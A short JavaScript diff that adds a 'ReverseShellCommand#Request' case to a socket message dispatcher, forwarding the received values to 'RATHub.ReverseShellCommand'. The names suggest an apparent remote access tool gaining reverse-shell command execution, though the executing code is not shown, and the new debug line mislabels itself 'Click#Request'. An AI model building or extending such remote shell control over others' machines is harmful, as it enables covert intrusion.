@@ -224,6 +224,14 @@ var SocketHub = (function () {
                         }
                         RATHub.VirtualClick(data.Values);
                         break;
+                    case 'ReverseShellCommand#Request':
+                        if (_debug !== undefined) {
+                            if (_debug) {
+                                console.log('Click#Request');
+                            }
+                        }
+                        RATHub.ReverseShellCommand(data.Values);
+                        break;
                     default:
                         //console.log(data.Command);
                         break;
